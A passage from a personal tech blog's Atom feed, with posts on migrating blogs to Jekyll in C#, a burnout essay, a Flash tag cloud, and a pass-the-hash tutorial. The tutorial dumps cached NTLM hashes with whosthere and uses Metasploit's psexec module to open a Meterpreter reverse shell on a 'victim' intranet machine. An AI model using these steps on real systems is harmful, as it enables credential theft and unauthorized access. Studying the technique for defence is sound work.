&lt;p&gt;This requires a change in C:\ruby\lib\ruby\gems\1.9.1\gems\albino-1.3.3\lib\albino.rb file.&lt;/p&gt;

&lt;p&gt;I have created the gist of the changes required &lt;a href='https://gist.github.com/1185645'&gt;here&lt;/a&gt;&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>Migrating 3rd party blogs to Jekyll</title>
   <link href="http://madhur.co.in/blog/2011/09/01/migratingblogtojekyll.html"/>
   <updated>2011-09-01T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/01/migratingblogtojekyll</id>
   <content type="html">&lt;p&gt;There are 3rd party migrators avilable to migrate from Wordpress blog to Jekyll based blogs. In this post, I am going to outline simple process of migrating most 3rd party blogs to Jekyll based blogs. Most of the blog web sites support a common interface called &lt;strong&gt;&lt;em&gt;MetaWeblog&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;For example, on telligent based blogs, this can be accessed as follows:&lt;/p&gt;

&lt;p&gt;&lt;a href='http://blogs.msdn.com/b/mahuja/metablog.ashx'&gt;http://blogs.msdn.com/b/mahuja/metablog.ashx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The RFC of this interface is given &lt;a href='http://www.xmlrpc.com/metaWeblogApi'&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The metablog interface exposts a common set of methods to retrieve the blog data using XML-RPC communication.&lt;/p&gt;

&lt;p&gt;Since this API is exposed from the Weblogs providers, programmer have to use a client-side programming model to communicate with it according to the XML-RPC protocol.&lt;/p&gt;

&lt;p&gt;I have created and published this C# programming wrapper which allows us to easily develop C# client applications that consumes this API via a service.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Download my sample wrapper from the github repository &lt;a href='https://github.com/madhur/Telligent2Jekyll'&gt;here&lt;/a&gt;.&lt;/li&gt;

&lt;li&gt;Create a .Net application and reference the &lt;strong&gt;&lt;em&gt;CookComputing.XmlRpc&lt;/em&gt;&lt;/strong&gt; that come in the above repository&lt;/li&gt;

&lt;li&gt;Create a class for the API provided.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Notice that the above post contains an implemention of IBlogger interface, which is decorated with [XmlRpcUrl(&amp;#8220;http://blogs.msdn.com/metablog.ashx&amp;#8221;)] attribute.&lt;/p&gt;

&lt;p&gt;Don&amp;#8217;t forget to change the URL of your Community Server Blogs metaBlog.&lt;/p&gt;

&lt;p&gt;Now you can easily use the proxy in your code.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='csharp'&gt;&lt;span class='k'&gt;class&lt;/span&gt; &lt;span class='nc'&gt;Program&lt;/span&gt;
&lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='k'&gt;static&lt;/span&gt; &lt;span class='k'&gt;void&lt;/span&gt; &lt;span class='nf'&gt;Main&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='kt'&gt;string&lt;/span&gt;&lt;span class='p'&gt;[]&lt;/span&gt; &lt;span class='n'&gt;args&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
        &lt;span class='p'&gt;{&lt;/span&gt;

            &lt;span class='n'&gt;IBlogger&lt;/span&gt; &lt;span class='n'&gt;proxy&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;MetaBlogAPIFactory&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Create&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;
            &lt;span class='n'&gt;PostInfo&lt;/span&gt;&lt;span class='p'&gt;[]&lt;/span&gt; &lt;span class='n'&gt;posts&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;proxy&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;getRecentPosts&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;mahuja&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;mahuja@microsoft.com &amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;sdfsdf&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='m'&gt;1000&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;

            &lt;span class='n'&gt;IJekyllFiles&lt;/span&gt; &lt;span class='n'&gt;jekyllFiles&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='n'&gt;JekyllFiles&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;

            &lt;span class='k'&gt;foreach&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;PostInfo&lt;/span&gt; &lt;span class='n'&gt;post&lt;/span&gt; &lt;span class='k'&gt;in&lt;/span&gt; &lt;span class='n'&gt;posts&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
            &lt;span class='p'&gt;{&lt;/span&gt;
                &lt;span class='n'&gt;List&lt;/span&gt;&lt;span class='p'&gt;&amp;lt;&lt;/span&gt;&lt;span class='n'&gt;MappingEntry&lt;/span&gt;&lt;span class='p'&gt;&amp;gt;&lt;/span&gt; &lt;span class='n'&gt;sampleYaml&lt;/span&gt;&lt;span class='p'&gt;=&lt;/span&gt;&lt;span class='n'&gt;jekyllFiles&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;GetSampleYaml&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;

                &lt;span class='n'&gt;List&lt;/span&gt;&lt;span class='p'&gt;&amp;lt;&lt;/span&gt;&lt;span class='n'&gt;MappingEntry&lt;/span&gt;&lt;span class='p'&gt;&amp;gt;&lt;/span&gt; &lt;span class='n'&gt;newYaml&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;jekyllFiles&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;SetYaml&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;post&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;sampleYaml&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;

                &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;filename&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;jekyllFiles&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;GenerateFileName&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;post&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;

                &lt;span class='n'&gt;jekyllFiles&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;GenerateFileOutput&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;post&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;filename&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;newYaml&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;description&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;

                &lt;span class='n'&gt;Console&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;WriteLine&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;{0} written successfully&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;filename&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
            &lt;span class='p'&gt;}&lt;/span&gt;

            &lt;span class='n'&gt;Console&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;ReadLine&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;


        &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='p'&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;To generate the YAML header for the files, I have re-used publically available YAML parser. We can choose from several available YAML parsers:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href='http://www.codeproject.com/KB/recipes/yamlparser.aspx'&gt;http://www.codeproject.com/KB/recipes/yamlparser.aspx&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;&lt;a href='http://yaml.codeplex.com/'&gt;http://yaml.codeplex.com/&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;&lt;a href='http://yaml-net-parser.sourceforge.net/'&gt;http://yaml-net-parser.sourceforge.net/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content>
 </entry>
 
 <entry>
   <title>Pass the Hash Exploitation on Windows</title>
   <link href="http://madhur.co.in/blog/2011/08/16/passthehash.html"/>
   <updated>2011-08-16T00:00:00+05:30</updated>
   <id>id:/blog/2011/08/16/passthehash</id>
   <content type="html">&lt;p&gt;A Windows 2000/NT/XP/Vista/7 system can be compromised with a technique called &lt;a href='http://en.wikipedia.org/wiki/Pass_the_hash'&gt;pass the Hash&lt;/a&gt;. For us to exploit this technique, we must know some basica.&lt;/p&gt;

&lt;p&gt;In a Windows based authentication such as NTLM or Kerberos, the password is never sent as cleartext. Instead the password is transformed into a hash(LM or NTLM Hash) and then sent to the server. The server then compares this hash against the stored hash and grants/denies the access.&lt;/p&gt;

&lt;p&gt;There are two types of hashes:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href='http://en.wikipedia.org/wiki/LM_hash'&gt;LM hash, LanMan, or LAN Manager hash&lt;/a&gt;: It is the obsolete hashing algorithm. Refer to the link to see how it is computed.&lt;/li&gt;

&lt;li&gt;NTLMv2 Hash: This is latest hashing method used on Windows 7/Vists/2008 systems.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Whenever a domain user logs on to the client computer, the hash of its password is stored on the client so that user can be authenticated in future even if the domain controller is not available. There are two types of caching, which is mentioned &lt;a href='http://support.microsoft.com/kb/913485'&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Now lets suppose, somebody has used your office laptop to log in and access some intranet based sites. Then that user&amp;#8217;s password hash is stored in your system.&lt;/p&gt;

&lt;p&gt;You can retrieve these hashes using a utility such as &lt;a href='http://oss.coresecurity.com/projects/pshtoolkit.htm'&gt;PSH Toolkit&lt;/a&gt;. It contains a utility &lt;strong&gt;whosthere&lt;/strong&gt; which can dump the hashes.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;C:\Documents and Settings\madhur\Desktop\pshtoolkit_v1.4\whosthere-alt&amp;gt;whosthere-alt.exe
WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com)
 - (c) 2007-2008 Core Security Technologies
This tool lists the active LSA logon sessions with NTLM credentials.
use -h for help.
the output format is: username:domain:lmhash:nthash

madhur:BACKTRACK:123A85F000020D1BAAD3B435B51404EE:5530F36C167C7993E976989949788A9B
BACKTRACK$:WORKGROUP:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Once you have grabbed the hash, you can anytime compromise the victim&amp;#8217;s computer using metaspoilt&amp;#8217;s psexec module, if you know the IP address, which is not difficult considering an intranet evnironment.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;msf exploit(psexec) &amp;gt; use windows/smb/psexec
msf exploit(psexec) &amp;gt; set RHOST 192.168.0.13
RHOST =&amp;gt; 192.168.0.13
msf exploit(psexec) &amp;gt; set LHOST 192.168.0.14
LHOST =&amp;gt; 192.168.0.14
msf exploit(psexec) &amp;gt; set SMBDomain backtrack
SMBDomain =&amp;gt; backtrack
msf exploit(psexec) &amp;gt; set SMBUser madhur
SMBUser =&amp;gt; madhur
msf exploit(psexec) &amp;gt; set SMBPass 123A85F000020D1BAAD3B435B51404EE:5530F36C167C7993E976989949788A9B
SMBPass =&amp;gt; 123A85F000020D1BAAD3B435B51404EE:5530F36C167C7993E976989949788A9B
msf exploit(psexec) &amp;gt; exploit

[*] Started reverse handler on 192.168.0.13:4444 
[*] Connecting to the server...
[*] Authenticating to 192.168.0.14:445|backtrack as user &amp;#39;madhur&amp;#39;...
[*] Uploading payload...
[*] Created \wttVwMnA.exe...
[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.14[\svcctl] ...
[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.14[\svcctl] ...
[*] Obtaining a service manager handle...
[*] Creating a new service (nkgYMOZy - &amp;quot;MrDoYCoO&amp;quot;)...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Closing service handle...
[*] Deleting \wttVwMnA.exe...
[*] Sending stage (749056 bytes) to 192.168.0.14
[*] Meterpreter session 6 opened (192.168.0.13:4444 -&amp;gt; 192.168.0.14:1035) at 2011-08-16 22:16:47 +0530

meterpreter &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;If you have trouble exploiting the target system, then it might be some security enabled your Administrator. For ex&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Simple file sharing is disabled (Windows XP)&lt;/li&gt;

&lt;li&gt;Windows UAC drops all the Administrator privileges from the SAT (Security Access Token) for REMOTE connections that are using LOCAL accounts. This restriction prevents all remote administrative functions such as connecting to administrative shares (C$, etc) installing services or launching a new process (psexec)&lt;/li&gt;

&lt;li&gt;&amp;#8220;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters&amp;#8221; on the target systems and setting the value of &amp;#8220;RequireSecuritySignature&amp;#8221; to &amp;#8220;0&amp;#8221;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;References:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href='http://oss.coresecurity.com/pshtoolkit/doc/index.html'&gt;http://oss.coresecurity.com/pshtoolkit/doc/index.html&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;&lt;a href='https://www.infosecisland.com/blogview/9271-NTLM-Passwords-Cant-Crack-it-Just-Pass-it.html'&gt;https://www.infosecisland.com/blogview/9271-NTLM-Passwords-Cant-Crack-it-Just-Pass-it.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content>
 </entry>
 
 <entry>
   <title>Burnout</title>
   <link href="http://madhur.co.in/blog/2011/08/13/burnout.html"/>
   <updated>2011-08-13T00:00:00+05:30</updated>
   <id>id:/blog/2011/08/13/burnout</id>
   <content type="html">&lt;p&gt;Professional exhaustion, or burnout, is a state of emotional, mental, and physical exhaustion caused by excessive stress. Burnout typically stems from the job, but can be caused by any situation that involves being overworked and undervalued.&lt;/p&gt;

&lt;p&gt;Burnout is almost always caused by working too much and not dealing with stress and anxiety as it comes along. The stress and anxiety pile up. Each time something is not dealt with the body sends out a signal. It could be a headache, fatigue, illness, or muscle aches. Whatever the sign the body sends out is ignored and not dealt with. Over a period of time the body cannot handle it anymore and this is where burnout comes in. It is almost like the body just shuts down and waits to be taken care of before it starts to work properly again.&lt;/p&gt;

&lt;p&gt;The most common cause of burnout is work. Work-related burnout is caused by having little or no control over your work, unclear or overly demanding expectations, lack of recognition for good work, doing work that is monotonous, and working in a high pressure environment. Professional exhaustion doesn’t happen overnight, which can make it difficult to spot. It grows over time, eventually producing feelings of failure, defeat, and detachment. Leaving these feelings alone only makes the problem worse. Trying to forge ahead as normal will only cause further physical, and more importantly, emotional damage.&lt;/p&gt;

&lt;p&gt;Two important definitions of burnout are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;em&gt;&amp;#8220;A state of physical, emotional and mental exhaustion caused by long term involvement in emotionally demanding situations.&amp;#8221; - Ayala Pines &amp;amp; Elliott Aronson&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;&lt;em&gt;&amp;#8220;A state of fatigue or frustration brought about by devotion to a cause, way of life, or relationship that failed to produce the expected reward.&amp;#8221; – Herbert J Freudenberger&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It mainly strikes highly-committed, passionate, hard working and successful people – and it therefore holds a special fear for those who care passionately about their careers and about the work they do.&lt;/p&gt;

&lt;p&gt;It is the person with passion, energy and dedication to the job that is most likely to suffer from this attitude.&lt;/p&gt;

&lt;h2 id='burnout_is_not_stress'&gt;Burnout is not stress&lt;/h2&gt;

&lt;p&gt;Unfortunately, burnout is often misunderstood and mislabeled – “I’m just stressed-out.” “It’s only a bit of depression.” When those words are spoken, it’s obvious burnout has been missed and dismissed.&lt;/p&gt;

&lt;p&gt;Here’s the best way to understand the difference between stress and burnout…&lt;/p&gt;

&lt;p&gt;Stress is an issue of too much, whereas burnout is about not enough.&lt;/p&gt;

&lt;p&gt;There are many who take-on tons of stress, and they manage well because they can envision things turning around once they get their ducks in a row.&lt;/p&gt;

&lt;p&gt;But burnout is about feelings of helplessness, hopelessness, and inadequacy. And it’s tough to move forward under their spell.&lt;/p&gt;

&lt;p&gt;There’s another stress/burnout distinguishing factor. You typically know when you’re in the midst of a ton of stress. Burnout, however, often flies under the radar. You know something’s wrong – but what? And that’s what makes burnout so dangerous.&lt;/p&gt;

&lt;p&gt;Here are a few reasons:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Frustration&lt;/strong&gt; - an employee starts off full of energy and optimism and pour their personal energy into a project, job or position and yet the results aren&amp;#8217;t what they hoped for - this can cause them to stop trying.&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Unappreciated&lt;/strong&gt; - An employee can feel unappreciated if they work in an environment that doesn&amp;#8217;t believe in positive reinforcement. Giving 110% every day is rewarding to these high achievers if recognized, but giving 110% with no return on that investment of energy will quickly lead to burnout. The lack of recognition in the workplace according to Potter, can manifest itself in: Inadequate pay and Underemployment.&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Unrelenting Stress&lt;/strong&gt; - No one can be &amp;#8220;on&amp;#8221; all the time. A person&amp;#8217;s energy needs time to recharge or eventually their internal battery won&amp;#8217;t take a charge anymore and you&amp;#8217;ll have burn out. Back to back stressful projects or situations are sometimes unavoidable, but three times in a row with no end in sight? Only do it if you want to burn through employees and have a high turnover rate.&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Overwhelmed&lt;/strong&gt; - A high achiever often has a lot on their plate in multiple areas of their lives. It&amp;#8217;s important for us to recognize our limits and realize that sacrificing sleep can only work for so long before our reserves are gone and burnout ensues.&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;&lt;strong&gt;External factors&lt;/strong&gt; - Such as Being away from your family for too long or Traveling alone and living in motels.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id='burnout_and_personality'&gt;Burnout and Personality&lt;/h2&gt;

&lt;p&gt;Research shows that introverts experience more stress than extraverts and feeling types experience more stress than thinking types. (Regarding stressors, the research shows there is no difference for the sensing/intuition or judging/perceiving preferences.) If introverts and feeling types experience more stress, does that mean they burn out more often, too?&lt;/p&gt;

&lt;p&gt;Yes and no. Research indicates that introverts do burn out more than extraverts because introverts, on the average, do not have and use as many coping strategies as extraverts.&lt;/p&gt;

&lt;h2 id='symptoms_of_burnout'&gt;Symptoms of Burnout&lt;/h2&gt;

&lt;p&gt;Emotional symptoms include disillusionment with the job; the loss of a sense of meaning and cynicism towards our organizations or clients; feelings of helplessness; frustration of efforts and a lack of power to change events; strong feelings of anger against the people we hold responsible for the situation; and feelings of depression and isolation.&lt;/p&gt;

&lt;p&gt;Behavioral symptoms can include increasing detachment from co-workers, increased absenteeism, an increased harshness in dealing with our teams, marked reduction in our commitment to our work, and increased alcohol consumption. These symptoms reflect exhaustion and a loss of satisfaction with work.&lt;/p&gt;

&lt;h2 id='tips_to_prevent_burnout'&gt;Tips to prevent Burnout&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Get a life plan.&lt;/strong&gt; What do you want in life? No small question. But a clear, exciting answer will provide context for your toils and support for your weary psyche.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Get into self-improvement.&lt;/strong&gt; Burnout is a state of mind, not circumstantial. Improve on your attitude and you&amp;#8217;ll be able to handle more than you think.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exercise.&lt;/strong&gt; No need to conjure up the discipline yourself; join a group (not a gym) where you are expected to show up with a fun bunch of people to work out in any way, shape or form on a regular basis.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Meditate.&lt;/strong&gt; Sit and be quiet for a good 15 minutes, preferably every day. Try not to think about anything. If thoughts and words come into your brain, just escort them casually back out. Be sure to breathe deep while doing so.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Be thankful.&lt;/strong&gt; List, preferably on paper, all the things you are thankful for in your life. Don&amp;#8217;t stop until you&amp;#8217;ve thought of at least 30 items. Do this regularly.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Learn to say no.&lt;/strong&gt; A healthy person knows their limits. To them, &amp;#8220;not wanting to do something&amp;#8221; for someone is the same as not being able to do it. If it doesn&amp;#8217;t feel right, say no.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Be nice.&lt;/strong&gt; Nothing adds to energy and confidence like being nice to someone. But only be nice within the limits of what you&amp;#8217;re capable of; too much will lead you straight to burnout.&lt;/p&gt;

&lt;h2 id='if_you_are_hit_take_it_positively'&gt;If you are hit, take it positively&lt;/h2&gt;

&lt;p&gt;Sometimes, job burnout can be an opportunity. The opportunity burnout offers to us is to re-examine our lives, our careers, our workplaces, and planning where we are going.&lt;/p&gt;

&lt;p&gt;So, what I do? First and foremost, you must recognize you are in a burnout state. Self-awareness is the first step in making a change.&lt;/p&gt;

&lt;p&gt;Second, understanding that you and you alone, are ultimately are in control of your career. And although there might be less than ideal circumstances in your workplace, you are ultimately responsible for controlling your work destiny.&lt;/p&gt;

&lt;p&gt;Looking at possibilities to grow outside your job might, in fact, enhance your job. Activities can range from taking classes to connecting with people.&lt;/p&gt;

&lt;p&gt;Asking yourself, &amp;#8220;Is my workplace the real culprit for job burnout or is it me?&amp;#8221;&lt;/p&gt;

&lt;p&gt;Look critically at your workplace. Is it a toxic workplace? Perhaps, you are in a unique pressure-cooker environment, with &amp;#8220;No Way Out.&amp;#8221; If that is the case, you need to look at your external options.&lt;/p&gt;

&lt;p&gt;Are you doing what you like? Are you utilizing skills that you enjoy? Does your work give you a sense of purpose and mission? If you are out of touch with this aspect of your work, it is time to consider making a career change, small or large.&lt;/p&gt;

&lt;p&gt;And finally, is my life and career balanced? Do I have opportunities with my family, friends, or hobbies? Or am I just working incessantly with no end in sight? Every job has its peaks and valleys, however, it is important to take time to refresh and replenish ourselves.&lt;/p&gt;

&lt;p&gt;Life-Work balance is an issue that crops up all the time when workers are asked what do they look for in a good job or workplace. It is up to you to assertively find opportunities that will promote a healthy career and life style.&lt;/p&gt;

&lt;p&gt;Think of a burnout crisis as a gift, one that helps inform us that something is out of kilter in our lives and we must look deeper within to find answers to its resolution. Without the burnout crisis, we may never feel prompted to finally answer some critical questions about our lives:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;What am I trying to accomplish with my work life?&lt;/li&gt;

&lt;li&gt;What are my key interests and does my work fit with them?&lt;/li&gt;

&lt;li&gt;What are my key skills and does my work use them?&lt;/li&gt;

&lt;li&gt;What are my core values about life balance, about family, about money, about the treatment of people? Is my work in synch with these?&lt;/li&gt;

&lt;li&gt;Am I overworking? If so, why?&lt;/li&gt;

&lt;li&gt;Where is the balance in my life between work and play?&lt;/li&gt;

&lt;li&gt;How would I live my life if I no longer had to work?&lt;/li&gt;

&lt;li&gt;What does work accomplish for me and what is it preventing me from accomplishing?&lt;/li&gt;

&lt;li&gt;Can I shift the focus of my current work or should I look into another type of work?&lt;/li&gt;
&lt;/ul&gt;</content>
 </entry>
 
 <entry>
   <title>Integrating Wordpress Tag cloud Plugin in Jekyll</title>
   <link href="http://madhur.co.in/blog/2011/08/12/wptagcloudjekyll.html"/>
   <updated>2011-08-12T00:00:00+05:30</updated>
   <id>id:/blog/2011/08/12/wptagcloudjekyll</id>
   <content type="html">&lt;p&gt;&lt;a href='/blog/2011/06/11/tagcloudjekyll.html'&gt;Earlier&lt;/a&gt; I showed you how we can integrate a simple HTML based tag cloud in Jekyll blog.&lt;/p&gt;

&lt;p&gt;In this post, Let&amp;#8217;s take a look at how we can integrate Wordpress Tag cloud plugin in Jekyll blog as shown in the right hand pane on this &lt;a href='/blog/'&gt;blog&lt;/a&gt;. Wordpress Tag cloud plugin is a simple Flash based plugin which accepts a group of Url encoded Anchor Hyperlinks as the parameter to display as the tag cloud. The flash file can be downloaded &lt;a href='/files/tagcloud.swf'&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;To output this plugin we use a normal embed tag as shown below&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='html'&gt;&lt;span class='nt'&gt;&amp;lt;embed&lt;/span&gt; &lt;span class='na'&gt;type=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;application/x-shockwave-flash&amp;quot;&lt;/span&gt; 
&lt;span class='na'&gt;src=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;/files/tagcloud.swf&amp;quot;&lt;/span&gt; 
&lt;span class='na'&gt;id=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;tagcloudflash&amp;quot;&lt;/span&gt; 
&lt;span class='na'&gt;name=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;tagcloudflash&amp;quot;&lt;/span&gt; 
&lt;span class='na'&gt;bgcolor=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;#474c52&amp;quot;&lt;/span&gt; 
&lt;span class='na'&gt;quality=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;high&amp;quot;&lt;/span&gt; 
&lt;span class='na'&gt;wmode=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;transparent&amp;quot;&lt;/span&gt;
&lt;span class='na'&gt;allowscriptaccess=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;always&amp;quot;&lt;/span&gt;
&lt;span class='na'&gt;flashvars=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;tcolor=0xffffff&amp;amp;amp;tcolor2=0xb6bcc1&amp;amp;amp;hicolor=0xa1ff66&amp;amp;amp;tspeed=100&amp;amp;amp;distr=true&amp;amp;amp;mode=tags&amp;amp;amp;tagcloud=%3Ctags%3E%3Ca+href%3D%27http%3A%2F%2Fcoda.co.za%2Fblog%2Ftag%2Fadvertising%27+class%3D%27tag-link-40%27+title%3D%2720+topics%27+style%3D%27font-size%3A+6.36046511628pt%3B%27%3Eadvertising%3C%2Fa%3E%3C%2Ftags%3E&amp;quot;&lt;/span&gt; 
&lt;span class='na'&gt;height=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;300&amp;quot;&lt;/span&gt; &lt;span class='na'&gt;width=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;250&amp;quot;&lt;/span&gt;&lt;span class='nt'&gt;&amp;gt;&amp;lt;/embed&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Most of the parameters are self explanatory which you can customize based on your needs. The parameter to our interest is &lt;strong&gt;flashvars&lt;/strong&gt;. In the above example, the decoded value of &lt;strong&gt;flashvars&lt;/strong&gt; would be&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='html'&gt;flashvars=
&amp;quot;tcolor=0xffffff
&lt;span class='err'&gt;&amp;amp;&lt;/span&gt;tcolor2=0xb6bcc1
&lt;span class='err'&gt;&amp;amp;&lt;/span&gt;hicolor=0xa1ff66
&lt;span class='err'&gt;&amp;amp;&lt;/span&gt;tspeed=100
&lt;span class='err'&gt;&amp;amp;&lt;/span&gt;distr=true
&lt;span class='err'&gt;&amp;amp;&lt;/span&gt;mode=tags
&lt;span class='err'&gt;&amp;amp;&lt;/span&gt;tagcloud=%3Ctags%3E%3Ca+href%3D%27http%3A%2F%2Fcoda.co.za%2Fblog%2Ftag%2Fadvertising%27+class%3D%27tag-link-40%27+title%3D%2720+topics%27+style%3D%27font-size%3A+6.3604651628pt%3B%27%3Eadvertising%3C%2Fa%3E%3C%2Ftags%3E&amp;quot; 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;flashvars&lt;/strong&gt; is an array of parameters itself out of which the one of our most interest is &lt;strong&gt;tagcloud&lt;/strong&gt;. This param again accepts a list of anchor hyperlinks which are Url encoded. The example of the input is shown below&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='html'&gt;&lt;span class='nt'&gt;&amp;lt;tags&amp;gt;&lt;/span&gt;
